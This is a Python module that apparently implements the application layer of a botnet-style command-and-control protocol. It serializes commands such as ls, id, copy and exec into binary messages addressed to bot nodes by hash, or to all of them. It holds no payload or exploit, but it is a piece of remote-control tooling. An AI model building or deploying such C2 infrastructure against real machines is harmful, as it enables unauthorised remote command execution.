from typing import Callable, Optional, Union
from .messages import BinaryMessage, hash_id, MsgType, MessageFlags

DEBUG = False

def debug_print(msg: str, prefix: str = "DEBUG"):
    if DEBUG:
        print(f"[{prefix}] {msg}")

class ApplicationLayer:
    """
    Top layer: Command & Control interface.
    Handles BinaryMessages.
    """
    
    def __init__(self, node_id: str, debug: bool = False):
        self.node_id = node_id
        global DEBUG
        DEBUG = debug
        self.lower_layer = None
        self._receive_callback: Optional[Callable[[dict], None]] = None
        
        # Pre-compute my hash
        self.my_hash = hash_id(node_id)
    
    def set_lower_layer(self, layer):
        self.lower_layer = layer
    
    def on_receive(self, callback: Callable[[dict], None]):
        """Register callback for received messages."""
        self._receive_callback = callback
    
    def send(self, target: str, msg_type_str: str, **kwargs):
        """
        Send a message.
        Args:
            target: Target node ID or "ALL"
            msg_type_str: "command" or "response"
            kwargs: 
                - cmd: str (for command)
                - arg: str (for command)
                - output: str (for response)
        """
        if msg_type_str == "command":
            cmd = kwargs.get("cmd", "")
            arg = kwargs.get("arg", "")
            
            # Map cmd string to MsgType
            # TODO: Better mapping. For now hardcoded common ones.
            mtype = MsgType.UNKNOWN
            if cmd == "ping": mtype = MsgType.PING
            elif cmd == "w": mtype = MsgType.W
            elif cmd == "ls": mtype = MsgType.LS
            elif cmd == "id": mtype = MsgType.ID
            elif cmd == "copy": mtype = MsgType.COPY
            elif cmd == "exec": mtype = MsgType.EXEC
            
            payload = arg.encode('utf-8')
            flags = MessageFlags.REQUEST
            
        elif msg_type_str == "response":
            output = kwargs.get("output", "")
            # Response doesn't strict type, maybe echo original type? 
            # For simplicity, we can use UNKNOWN or PING for Pong. 
            # Or better: Response flag set.
            mtype = MsgType.PING # Default or tracked
            payload = output.encode('utf-8')
            flags = MessageFlags.RESPONSE
        else:
            return

        if target.startswith("HASH_"):
            # Target is already a hash string from receive_from_below
             try:
                 target_hash = int(target[5:], 16)
             except ValueError:
                 target_hash = hash_id(target)
        else:
            target_hash = hash_id(target)
            
        sender_hash = self.my_hash
        
        msg = BinaryMessage(target_hash, sender_hash, mtype, flags, payload)
        serialized = msg.serialize()
        
        if self.lower_layer:
            self.lower_layer.send_from_above(serialized)
    
    def receive_from_below(self, data: bytes):
        """Handle received bytes from transport layer."""
        try:
            # Try to deserialize as BinaryMessage
            msg = BinaryMessage.deserialize(data)
            if not msg:
                # Fallback: maybe it's raw JSON from legacy?
                # But TransportLayer should have given us bytes.
                return

            # Convert back to dict for generic callback handling (compatibility)
            # Or cleaner: callback receives object.
            # Keeping dict for compatibility with existing controller/bot logic
            
            # Map mtype to string cmd
            cmd_str = "unknown"
            if msg.msg_type == MsgType.PING: cmd_str = "ping"
            elif msg.msg_type == MsgType.W: cmd_str = "w"
            elif msg.msg_type == MsgType.LS: cmd_str = "ls"
            elif msg.msg_type == MsgType.ID: cmd_str = "id"
            elif msg.msg_type == MsgType.COPY: cmd_str = "copy"
            elif msg.msg_type == MsgType.EXEC: cmd_str = "exec"
            
            target_str = f"HASH_{msg.target_id_hash:04x}"
            if msg.target_id_hash == self.my_hash:
                target_str = "ME"
            elif msg.target_id_hash == hash_id("ALL"):
                target_str = "ALL"
            
            parsed = {
                "sender": f"HASH_{msg.sender_id_hash:04x}",
                "target": target_str,
                "type": "response" if (msg.flags & MessageFlags.RESPONSE) else "command",
                "cmd": cmd_str,
                "arg": msg.payload.decode('utf-8', errors='ignore'),
                "output": msg.payload.decode('utf-8', errors='ignore') # same payload for response
            }
            
            if self._receive_callback:
                self._receive_callback(parsed)
                
        except Exception as e:
            debug_print(f"App RX Error: {e}", "APP")
